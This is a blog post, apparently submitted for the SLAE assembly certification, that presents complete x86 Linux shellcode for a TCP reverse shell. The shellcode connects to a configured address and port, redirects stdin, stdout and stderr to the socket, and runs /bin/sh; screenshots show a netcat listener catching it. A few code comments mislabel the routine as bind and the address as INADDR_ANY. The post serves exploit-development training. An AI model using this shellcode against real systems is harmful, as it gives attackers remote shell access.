---
title: "SLAE Assignment 2"
date: 2018-02-05
published: true
---

### SecurityTube Linux Assembly Expert (SLAE) Assignment 2

[GitHub code repo](https://github.com/wsummerhill/SLAE)

Assignment 2 of the SLAE is very similar to assignment 1. This time we’re required to create a TCP reverse shell and connect to an IP address and port of our choosing. These are configured right into the script at the top and can be modified as needed.

So for a TCP reverse shell, the functions required will be the following:
- socketCall
- connect
- dup2 (x3)
- execve

The new function we’re introducing is the connect function which can be seen below.
```bash
int connect(sockfd, *sockaddr addr, addrlen))
```

I used my previous code from Assignment 1 and removed some of the old functions then made some additions to get the following code below. 
```cpp
;Author: Will Summerhill
;Create shell_reverse_tcp shellcode
;reverse connection to IP address and port - accept as input
;exec shell on successful connection to remote host

;functions needed: socketcall (66 hex, 102 decimal), connect, dup2 (0x63), execve (0x11)


global _start


section .text
_start:
  ;Configure IP address and port here
  addr: equ 0x0101007F  ;IP Address = 127.0.1.1 in little endian
  port: equ 0x0427  ;Port = 9988 in little endian


; SocketCall function:
  xor  eax, eax    ;AF_INET = 2
  mov al, 0x2

  xor ebx, ebx    ;EBX: SOCK_STREAM = 1
  mov bl, 0x1

  xor edx, edx    ;EDX: IPPROTO_IP = 0

  push edx                ; TCP = 0
  push ebx                ; SOCK_STREAM = 1 
  push eax                ; AF_INET = 2 

  mov ecx, esp    ;save stack into ECX
  xor eax, eax
  mov al, 0x66    ;socketcall syscall = 0x66 hex (102 decimal)
  int 0x80        ;execute

  mov edx, eax    ;EDX = sockfd output

; Connect function: connect to configured IP/port
  ;int connect(sockfd, *sockaddr addr, addrlen))
  ;Push *addr() first onto stack
  ;*addr(addr family = AF_INET [2], port [9988], IP addr = INADDR_ANY [127.0.1.1])
  xor ebx, ebx
  push addr         ;INADDR_ANY = 127.0.0.1
  push word port    ;connect to port = 9988 in little endian  
  push word 0x2     ;AF_INET = 2
  mov ecx, esp      ;save stack into ECX

  ;Now push whole bind() function onto stack in reverse order
  push 0x10    ;addrlen size
  push ecx     ;*addr function
  push edx     ;sockfd = socket from Socketcall function above

  mov ecx, esp    ;save stack into ECX again

  ;call syscall to execute
  xor ebx, ebx
  mul ebx         ;zero out ebx and eax together
  mov al, 0x66    ;socketcall syscall = 0x66 hex (102 decimal)
  mov bl, 0x3     ;socketcall type = sys_connect 3

  mov ecx, esp    ;move to ECX for execution
  int 0x80        ;execute BIND

; Dup2 functions: redirect stdin, stdout, stderr to incoming socket
  ;dup2(int oldfd, newfd)  [syscall 63 (0x3f)]
  ;  EAX = 0x3f (63 decimal)
  ;  EBX = oldfd
  ;  ECX = newfd
  xor eax, eax
  mov al, 0x3f  ;dup2 syscall number (3f hex, 63 decimal)

  ;STDIN = 0
  mov ebx, edx  ;oldfd into EBX
  xor ecx, ecx  ;STDIN = 0
  int 0x80      ;execute dup2(oldfd = ebx, newfd = STDIN)

  ;STDOUT = 1
  xor eax, eax
  mov al, 0x3f  ;dup2 function
  mov ebx, edx  ;oldfd into EBX
  inc ecx       ;STDOUT = 1
  int 0x80      ;execute dup2(oldfd = ebx,  newfd = STDOUT)

  ;STDERR = 2
  xor eax, eax
  mov al, 0x3f  ;dup2 function
  mov ebx, edx
  inc ecx       ;STDERR = 2
  int 0x80      ;execute dup2(oldfd = ebx, newfd = STDERR)

; Execve function to execute //bin/sh
  ;execve(filename, argv[], envp[])
  ;  EBX = //bin/sh 0x0
  ;  ECX = address of //bin/sh
  ;  EDX = 0x000000

  ;Push contents in reverse order
  xor eax, eax
  push eax    ;push null first

  ; PUSH //bin/sh (8 bytes) in reverse order
  push 0x68732f2f    ;n/sh
  push 0x6e69622f    ;//bi
  mov ebx, esp       ;move into EBX 

  push eax  ;add null again
  push ebx  ;push address of //bin/sh to stack
  mov ecx, esp
  push eax  ;null terminator after //bin/sh
  mov edx, esp

  mov al, 0xb  ;execve syscall = 11
  int 0x80  ;execute EXECVE to start bind shell
```

Before executing the reverse shell we will setup a listener with netcat on the localhost to listen on port 9988. This is where the shell will get executed once connection is established.  

![EmbeddedImage](https://user-images.githubusercontent.com/35749735/206794238-4353d8a5-0960-4f8f-bf52-99152834de9d.png)

Now once I execute the program we’ll get a reverse shell on the listening host/port.  

![EmbeddedImage1](https://user-images.githubusercontent.com/35749735/206794246-49564487-89d0-46ad-8431-0e109d9ae1bb.png)

-----------

The assembly code can also be found here on my [Github](https://github.com/wsummerhill/SLAE/blob/master/Assignment%202).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE-1109
